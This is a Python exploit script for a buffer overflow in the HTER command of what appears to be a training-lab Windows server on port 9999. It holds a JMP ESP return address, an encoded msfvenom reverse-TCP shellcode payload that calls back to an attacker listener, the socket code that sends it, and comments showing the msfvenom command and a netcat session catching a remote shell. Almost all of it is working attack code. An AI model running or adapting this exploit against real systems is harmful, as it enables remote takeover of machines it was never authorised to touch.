#!/usr/bin/env python

#Author : Win Sam
#Description : Crash with 5017 Character using parameter "HTER"


#root@kali:~# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.102.21] from (UNKNOWN) [192.168.102.152] 49182
#Microsoft Windows [Version 6.0.6000]
#Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
#
#C:\Users\offsec\Desktop>whoami
#whoami
#vista252\offsec
#
#C:\Users\offsec\Desktop>

import socket
import sys



#625011AF   FFE4             JMP ESP


#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.102.21 lport=5555 -f hex BufferRegister=ESP -e x86/alpha_mixed
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 702 (iteration=0)
#x86/alpha_mixed chosen with final size 702
#Payload size: 702 bytes
#Final size of hex file: 1404 bytes
payload ="54594949494949494949494949494949494937515a6a415850304130416b41415132414232424230424241425850384142754a494b4c69786c4255506770677035306b394b557471695073544c4b563056506e6b6142744c4c4b427237644e6b52526758666f7837426a757676516b4f6c6c674c5531316c5772646c61307a61784f766d7771695739727872527253674c4b636242306c4b437a474c4e6b304c523173487a43615877714e3133614c4b52794750677148534e6b626934585863774a50496c4b50346e6b76616e367651796f4c6c59514a6f366d63315a6747486b50325569667553716d4c38574b434d664472557a4446386e6b736874643771494343564e6b666c704b6c4b4638476c677138534c4b33346c4b33316a704f79737465745644436b436b33515149627a4631396f6970514f436f505a4c4b62325a4b6e6d614d324844736652555043306178325764335032514f76346248704c525771367667696f4b654d684e705661333043306649395433644630424844694f70306b67704b4f7945505072703050463067303270615056304358586a444f494f4b50796f58555a37506a655555384b706c685356545545386332733037654d636f794a46506a64506146305735384e796e45734455316b4f6e356e6559503344644c496f426e65583345386c706838706d654f525276696f794535384533306d453447706f794b5370577367714776517a56706a7232363963666a42796d53566b7731545134674c433146616c4d3374675472305846377072646634363062767276705662663366326e614636364633463675385439484c474f6e664b4f38554e694970726e30566156596f6650353833386e67776d5530696f6e356f4b7a504f4539325146717879364f654d6d6d4d596f6b65774c6336434c455a4b30596b4b50616576656d6b715772333162324f306a37704633496f5a754141"


crash="B"*2041 + "AF115062" +payload +"A"*(5007-2049-len(payload))

#0x625011AF |JUMP ESP

exploits="HTER "+crash

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

exploit.connect(("192.168.102.152",9999))

print exploit.recv(1024)
print exploit.send(exploits)
print exploit.recv(1024)
exploit.close()
